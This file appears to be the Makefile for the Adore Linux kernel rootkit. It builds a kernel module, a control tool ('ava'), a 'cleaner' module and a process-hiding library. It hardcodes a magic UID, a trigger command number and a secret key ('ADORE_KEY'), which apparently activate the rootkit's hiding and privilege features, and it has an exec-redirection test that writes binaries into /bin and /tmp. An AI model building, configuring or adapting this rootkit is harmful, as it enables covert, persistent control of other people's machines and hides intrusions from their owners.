#
CC=cc
CFLAGS=-O2 -Wall

#CFLAGS+=-m486
CFLAGS+=-DELITE_CMD=77238

CFLAGS+=-DELITE_UID=32
CFLAGS+=-DCURRENT_ADORE=34
CFLAGS+=-DADORE_KEY=\"dhafqez\"

#CFLAGS+=-D__SMP__

CFLAGS+=-DMODVERSIONS
all:	adore ava cleaner

adore: adore.c
	rm -f adore.o
	$(CC) -c -I/usr/src/linux/include $(CFLAGS) adore.c -o adore.o
	
ava: ava.c libinvisible.c
	$(CC) $(CFLAGS) ava.c libinvisible.c -o ava

dummy: dummy.c
	$(CC) -c -I/usr/src/linux/include $(CFLAGS) dummy.c

cleaner: cleaner.c
	$(CC) -I/usr/src/linux/include -c $(CFLAGS) cleaner.c

exec-test: exec-test.c
	$(CC) -Wall -O2 exec-test.c -DSAYSO=\"ORIGINAL\" -o /bin/exec-test
	$(CC) -Wall -O2 exec-test.c -DSAYSO=\"FAKE\" -o /tmp/foobar
clean:
	rm -f core ava *.o
